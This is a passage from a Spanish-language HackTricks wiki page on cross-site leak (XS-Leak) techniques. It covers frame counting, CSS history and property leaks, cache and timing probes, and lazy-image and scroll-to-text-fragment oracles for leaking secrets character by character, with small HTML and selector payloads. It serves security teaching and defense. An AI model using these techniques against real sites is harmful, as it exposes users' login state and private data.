* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Evaluar la cantidad de elementos iframe inspeccionando la propiedad `window.length`.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n煤mero de frames en una web** abierta mediante `iframe` o `window.open` puede ayudar a identificar el **estado del usuario en esa p谩gina**.\
Adem谩s, si la p谩gina siempre tiene el mismo n煤mero de frames, verificar **continuamente** el n煤mero de frames puede ayudar a identificar un **patr贸n** que podr铆a filtrar informaci贸n.

Un ejemplo de esta t茅cnica es que en Chrome, un **PDF** puede ser **detectado** con el **conteo de frames** porque se utiliza internamente un `embed`. Existen [Par谩metros de URL Abierta](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permiten cierto control sobre el contenido como `zoom`, `view`, `page`, `toolbar`, donde esta t茅cnica podr铆a ser interesante.

### HTMLElements

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumen:** Leer el valor filtrado para distinguir entre 2 posibles estados
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La filtraci贸n de informaci贸n a trav茅s de elementos HTML es una preocupaci贸n en la seguridad web, especialmente cuando se generan archivos de medios din谩micos basados en informaci贸n del usuario, o cuando se agregan marcas de agua, alterando el tama帽o de los medios. Esto puede ser explotado por atacantes para diferenciar entre posibles estados al analizar la informaci贸n expuesta por ciertos elementos HTML.

### Informaci贸n Expuesta por Elementos HTML

* **HTMLMediaElement**: Este elemento revela los tiempos de `duraci贸n` y `buffered` de los medios, que se pueden acceder a trav茅s de su API. [Leer m谩s sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Expone `videoHeight` y `videoWidth`. En algunos navegadores, propiedades adicionales como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` y `webkitDecodedFrameCount` est谩n disponibles, ofreciendo informaci贸n m谩s detallada sobre el contenido multimedia. [Leer m谩s sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Esta funci贸n proporciona detalles sobre la calidad de reproducci贸n de video, incluido `totalVideoFrames`, que puede indicar la cantidad de datos de video procesados. [Leer m谩s sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Este elemento filtra la `altura` y `ancho` de una imagen. Sin embargo, si una imagen es inv谩lida, estas propiedades devolver谩n 0, y la funci贸n `image.decode()` ser谩 rechazada, indicando la falla al cargar la imagen correctamente. [Leer m谩s sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propiedad CSS

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumen:** Identificar variaciones en el estilo del sitio web que se correlacionen con el estado del usuario.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Las aplicaciones web pueden cambiar el **estilo del sitio web dependiendo del estado del usuario**. Los archivos CSS de origen cruzado pueden ser incrustados en la p谩gina del atacante con el **elemento de enlace HTML**, y las **reglas** se aplicar谩n a la p谩gina del atacante. Si una p谩gina cambia din谩micamente estas reglas, un atacante puede **detectar** estas **diferencias** dependiendo del estado del usuario.\
Como t茅cnica de filtraci贸n, el atacante puede usar el m茅todo `window.getComputedStyle` para **leer CSS** propiedades de un elemento HTML espec铆fico. Como resultado, un atacante puede leer propiedades CSS arbitrarias si se conoce el elemento afectado y el nombre de la propiedad.

### Historial CSS

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumen:** Detectar si se aplica el estilo `:visited` a una URL indicando que ya fue visitada
* **Ejemplo de C贸digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Seg煤n [**esto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), esto no funciona en Chrome sin cabeza.
{% endhint %}

El selector CSS `:visited` se utiliza para aplicar estilos diferentes a las URL si han sido visitadas previamente por el usuario. En el pasado, el m茅todo `getComputedStyle()` se pod铆a emplear para identificar estas diferencias de estilo. Sin embargo, los navegadores modernos han implementado medidas de seguridad para evitar que este m茅todo revele el estado de un enlace. Estas medidas incluyen devolver siempre el estilo calculado como si el enlace fuera visitado y restringir los estilos que se pueden aplicar con el selector `:visited`.

A pesar de estas restricciones, es posible discernir el estado visitado de un enlace de forma indirecta. Una t茅cnica implica enga帽ar al usuario para que interact煤e con un 谩rea afectada por CSS, espec铆ficamente utilizando la propiedad `mix-blend-mode`. Esta propiedad permite la mezcla de elementos con su fondo, revelando potencialmente el estado visitado seg煤n la interacci贸n del usuario.

Adem谩s, la detecci贸n se puede lograr sin interacci贸n del usuario explotando los tiempos de renderizado de los enlaces. Dado que los navegadores pueden renderizar enlaces visitados y no visitados de manera diferente, esto puede introducir una diferencia de tiempo mensurable en el renderizado. Se mencion贸 una prueba de concepto (PoC) en un informe de error de Chromium, demostrando esta t茅cnica utilizando m煤ltiples enlaces para amplificar la diferencia de tiempo, haciendo as铆 que el estado visitado sea detectable mediante an谩lisis de tiempo.

Para m谩s detalles sobre estas propiedades y m茅todos, visita sus p谩ginas de documentaci贸n:

* `:visited`: [Documentaci贸n de MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documentaci贸n de MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documentaci贸n de MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### Contenido Fuga de X-Frame de ContentDocument

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Encabezados
* **M谩s informaci贸n**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumen:** En Google Chrome, se muestra una p谩gina de error dedicada cuando se bloquea una p谩gina para ser incrustada en un sitio de origen cruzado debido a restricciones de X-Frame-Options.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

En Chrome, si una p谩gina con el encabezado `X-Frame-Options` establecido en "deny" o "same-origin" se incrusta como un objeto, aparece una p谩gina de error. Chrome devuelve de manera 煤nica un objeto de documento vac铆o (en lugar de `null`) para la propiedad `contentDocument` de este objeto, a diferencia de los iframes u otros navegadores. Los atacantes podr铆an explotar esto al detectar el documento vac铆o, revelando potencialmente informaci贸n sobre el estado del usuario, especialmente si los desarrolladores establecen de manera inconsistente el encabezado X-Frame-Options, a menudo pasando por alto las p谩ginas de error. La conciencia y la aplicaci贸n consistente de los encabezados de seguridad son cruciales para prevenir tales fugas.

### Detecci贸n de Descargas

* **M茅todos de Inclusi贸n**: Marcos, Pop-ups
* **Diferencia Detectable**: Encabezados
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

El encabezado `Content-Disposition`, espec铆ficamente `Content-Disposition: attachment`, instruye al navegador a descargar contenido en lugar de mostrarlo en l铆nea. Este comportamiento puede ser explotado para detectar si un usuario tiene acceso a una p谩gina que desencadena una descarga de archivo. En los navegadores basados en Chromium, existen algunas t茅cnicas para detectar este comportamiento de descarga:

1. **Monitoreo de la Barra de Descarga**:
* Cuando se descarga un archivo en los navegadores basados en Chromium, aparece una barra de descarga en la parte inferior de la ventana del navegador.
* Al monitorear los cambios en la altura de la ventana, los atacantes pueden inferir la aparici贸n de la barra de descarga, lo que sugiere que se ha iniciado una descarga.
2. **Navegaci贸n de Descarga con Iframes**:
* Cuando una p谩gina desencadena una descarga de archivo usando el encabezado `Content-Disposition: attachment`, no provoca un evento de navegaci贸n.
* Cargando el contenido en un iframe y monitoreando los eventos de navegaci贸n, es posible verificar si la disposici贸n del contenido provoca una descarga de archivo (sin navegaci贸n) o no.
3. **Navegaci贸n de Descarga sin Iframes**:
* Similar a la t茅cnica de iframe, este m茅todo implica usar `window.open` en lugar de un iframe.
* Monitorear los eventos de navegaci贸n en la ventana reci茅n abierta puede revelar si se desencaden贸 una descarga de archivo (sin navegaci贸n) o si el contenido se muestra en l铆nea (ocurre la navegaci贸n).

En escenarios donde solo los usuarios registrados pueden desencadenar tales descargas, estas t茅cnicas se pueden utilizar para inferir indirectamente el estado de autenticaci贸n del usuario basado en la respuesta del navegador a la solicitud de descarga.

### Bypass de Cach茅 HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: Temporizaci贸n
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumen:** Un atacante puede discernir descargas de archivos aprovechando iframes; la accesibilidad continua del iframe implica una descarga de archivo exitosa.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Por qu茅 esta t茅cnica es interesante: Chrome ahora tiene **particionamiento de cach茅**, y la clave de cach茅 de la p谩gina reci茅n abierta es: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, pero si abro una p谩gina de ngrok y uso fetch en ella, la clave de cach茅 ser谩: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clave de cach茅 es diferente**, por lo que la cach茅 no se puede compartir. Puedes encontrar m谩s detalles aqu铆: [Obtenci贸n de seguridad y privacidad mediante la partici贸n de la cach茅](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comentario de [**aqu铆**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un sitio `ejemplo.com` incluye un recurso de `*.ejemplo.com/recurso` entonces ese recurso tendr谩 la **misma clave de cach茅** que si el recurso fuera solicitado directamente a trav茅s de una **navegaci贸n de nivel superior**. Esto se debe a que la clave de cach茅 est谩 compuesta por _eTLD+1_ de nivel superior y _eTLD+1_ del marco.

Dado que acceder a la cach茅 es m谩s r谩pido que cargar un recurso, es posible intentar cambiar la ubicaci贸n de una p谩gina y cancelarla 20ms (por ejemplo) despu茅s. Si el origen cambi贸 despu茅s de la parada, significa que el recurso estaba en cach茅.\
O simplemente **enviar alg煤n fetch a la p谩gina potencialmente en cach茅 y medir el tiempo que tarda**.

### Redirecci贸n Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Redirecciones
* **M谩s informaci贸n**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumen:** Es posible averiguar si una respuesta a una solicitud de fetch es una redirecci贸n
* **Ejemplo de C贸digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Temporizaci贸n
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumen:** Es posible intentar cargar un recurso y abortarlo antes de que se cargue. Dependiendo de si se desencadena un error, el recurso estaba o no en cach茅.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Usa _**fetch**_ y _**setTimeout**_ con un **AbortController** para detectar si el **recurso est谩 en cach茅** y para eliminar un recurso espec铆fico de la cach茅 del navegador. Adem谩s, el proceso ocurre sin almacenar nuevo contenido en cach茅.
### Contaminaci贸n de Script

* **M茅todos de Inclusi贸n**: Elementos HTML (script)
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumen:** Es posible **sobrescribir funciones integradas** y leer sus argumentos incluso desde un **script de origen cruzado** (que no se puede leer directamente), lo que podr铆a **filtrar informaci贸n valiosa**.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Trabajadores de Servicio <a href="#service-workers" id="service-workers"></a>

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumen:** Medir el tiempo de ejecuci贸n de una web utilizando trabajadores de servicio.
* **Ejemplo de C贸digo**:

En el escenario dado, el atacante toma la iniciativa de registrar un **trabajador de servicio** dentro de uno de sus dominios, espec铆ficamente "attacker.com". A continuaci贸n, el atacante abre una nueva ventana en el sitio web objetivo desde el documento principal e instruye al **trabajador de servicio** para iniciar un temporizador. A medida que la nueva ventana comienza a cargarse, el atacante navega la referencia obtenida en el paso anterior a una p谩gina gestionada por el **trabajador de servicio**.

Al llegar la solicitud iniciada en el paso anterior, el **trabajador de servicio** responde con un c贸digo de estado **204 (Sin contenido)**, terminando efectivamente el proceso de navegaci贸n. En este punto, el **trabajador de servicio** captura una medici贸n del temporizador iniciado anteriormente en el paso dos. Esta medici贸n se ve influenciada por la duraci贸n de JavaScript que causa retrasos en el proceso de navegaci贸n.

{% hint style="warning" %}
En un tiempo de ejecuci贸n, es posible **eliminar factores de red** para obtener **mediciones m谩s precisas**. Por ejemplo, cargando los recursos utilizados por la p谩gina antes de cargarla.
{% endhint %}

### Temporizaci贸n de Fetch

* **M茅todos de Inclusi贸n**: API de Fetch
* **Diferencia Detectable**: Temporizaci贸n (generalmente debido al Contenido de la P谩gina, C贸digo de Estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumen:** Utilizar [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir el tiempo que tarda en realizarse una solicitud. Se pueden utilizar otros relojes.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Temporizaci贸n entre Ventanas

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: Temporizaci贸n (generalmente debido al Contenido de la P谩gina, C贸digo de Estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumen:** Utilizar [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir el tiempo que tarda en realizarse una solicitud utilizando `window.open`. Se pueden utilizar otros relojes.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias m谩s avanzadas del mundo.\
隆Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Con HTML o Re Inyecci贸n

Aqu铆 puedes encontrar t茅cnicas para exfiltrar informaci贸n desde un HTML de origen cruzado **inyectando contenido HTML**. Estas t茅cnicas son interesantes en casos donde por alguna raz贸n puedes **inyectar HTML pero no puedes inyectar c贸digo JS**.

### Marcado Colgante

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carga Perezosa de Im谩genes

Si necesitas **exfiltrar contenido** y puedes **agregar HTML antes del secreto** debes revisar las **t茅cnicas comunes de marcado colgante**.\
Sin embargo, si por alguna raz贸n **DEBES** hacerlo **car谩cter por car谩cter** (quiz谩s la comunicaci贸n es a trav茅s de un acierto en cach茅) puedes usar este truco.

Las **im谩genes** en HTML tienen un atributo "**loading**" cuyo valor puede ser "**lazy**". En ese caso, la imagen se cargar谩 cuando se vea y no mientras se carga la p谩gina:
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **agregar una gran cantidad de caracteres basura** (por ejemplo, **miles de "W"**) para **llenar la p谩gina web antes del secreto o agregar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Entonces, si por ejemplo nuestra **inyecci贸n aparece antes de la bandera**, la **imagen** se **cargar谩**, pero si aparece **despu茅s** de la **bandera**, la bandera + la basura **evitar谩n que se cargue** (tendr谩s que jugar con la cantidad de basura a colocar). Esto es lo que sucedi贸 en [**este writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Otra opci贸n ser铆a usar el **scroll-to-text-fragment** si est谩 permitido:

#### Scroll-to-text-fragment

Sin embargo, haces que el **bot acceda a la p谩gina** con algo como
```
#:~:text=SECR
```
Entonces la p谩gina web ser谩 algo como: **`https://victima.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y la carga perezosa de la imagen, luego se agrega el secreto del bot.

Lo que este texto har谩 es hacer que el bot acceda a cualquier texto en la p谩gina que contenga el texto `SECR`. Como ese texto es el secreto y est谩 justo **debajo de la imagen**, la **imagen solo se cargar谩 si el secreto adivinado es correcto**. As铆 que ah铆 tienes tu or谩culo para **filtrar el secreto car谩cter por car谩cter**.

Algunos ejemplos de c贸digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Tiempo de Carga Perezosa de Im谩genes Basado en el Tiempo

Si **no es posible cargar una imagen externa** que podr铆a indicar al atacante que la imagen se carg贸, otra opci贸n ser铆a intentar **adivinar el car谩cter varias veces y medir eso**. Si la imagen se carga, todas las solicitudes tomar铆an m谩s tiempo que si la imagen no se carga. Esto es lo que se us贸 en la [**soluci贸n de este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqu铆:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si se utiliza `jQuery(location.hash)`, es posible averiguar a trav茅s del tiempo si existe alg煤n contenido HTML, esto se debe a que si el selector `main[id='site-main']` no coincide, no es necesario verificar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci贸n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

Hay mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tambi茅n en cada secci贸n del wiki [https://xsleaks.dev/](https://xsleaks.dev/). Echa un vistazo all铆 para obtener m谩s informaci贸n sobre c贸mo protegerse contra estas t茅cnicas.

## Referencias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias m谩s avanzadas del mundo.\
Obt茅n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
